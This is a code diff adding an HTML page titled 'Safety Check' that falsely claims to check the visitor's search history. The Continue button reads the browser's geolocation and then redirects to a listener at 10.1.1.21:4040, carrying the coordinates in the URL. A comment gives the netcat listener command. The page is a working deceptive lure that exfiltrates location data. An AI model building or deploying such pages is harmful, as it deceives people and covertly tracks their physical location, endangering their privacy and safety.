@@ -1,12 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Safety Check</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
 </head>
+
 <body>
-    
+    <div class="container p-5 ">
+
+    <h1 class="text">Check the Safety of your Search History!</h1>
+
+    <button class="btn btn-info btn-lg btn-outline-dark" onclick="getLocation()">Continue</button>
+
+    <p class="text p-2" id="demo"></p>
+
+    </div>
+
+    <script>
+
+        let targetLocation = document.getElementById("demo");
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, errorCallback, { timeout: 5000 });
+            } else {
+                targetLocation.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            let latlong = targetLocation.innerHTML = "Latitude: "	+ position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
+            
+            document.location='http://10.1.1.21:4040/'+latlong; // $ nc -nlvp 4040
+        }
+
+        function errorCallback(error) {
+            targetLocation.innerHTML = 'Failed';
+        }
+
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+
 </body>
+
 </html>
